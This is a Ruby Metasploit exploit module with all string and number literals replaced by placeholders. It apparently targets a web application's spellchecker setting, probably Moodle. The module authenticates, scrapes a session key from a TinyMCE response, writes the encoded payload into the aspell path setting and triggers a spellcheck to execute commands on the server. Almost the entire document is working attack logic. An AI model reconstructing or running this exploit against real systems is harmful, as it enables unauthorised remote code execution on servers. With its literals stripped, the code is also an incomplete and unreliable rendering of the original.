require <str> require <str> class Metasploit4 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > [ <str> , <str> ] , <str> = > ARCH_CMD , <str> = > [ [ <str> , { } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def exploit init = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> ) } ) sess = init . get_cookies post = { <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] } print_status ( <str> << datastore [ <str> ] ) login = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> ) , <str> = > post , <str> = > sess } ) if ! login or login . code != <int> fail_with ( Failure :: NoAccess , <str> ) end sess = login . get_cookies print_status ( <str> ) sesskey = <str> if datastore [ <str> ] == <str> tinymce = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> ) + <str> , <str> = > sess } ) tinymce . body . each_line do | line | next if line !~ <str> sesskey = line [ <int> .. line . index ( <str> ) ] end if sesskey == <str> fail_with ( Failure :: UnexpectedReply , <str> ) end sesskey = REXML :: Document . new sesskey sesskey = sesskey . root . attributes [ <str> ] else sesskey = datastore [ <str> ] end post = { <str> = > <str> , <str> = > sesskey , <str> = > <str> , <str> = > <str> , <str> = > <str> } print_status ( <str> ) post = { <str> = > <str> , <str> = > sesskey , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > payload . encoded , <str> = > <str> } aspell = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> ) , <str> = > post , <str> = > sess } ) spellcheck = <str> print_status ( <str> ) resp = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> ) , <str> = > spellcheck , <str> = > <str> , <str> = > sess } ) if ! resp or resp . code != <int> fail_with ( Failure :: PayloadFailed , <str> ) end end end 
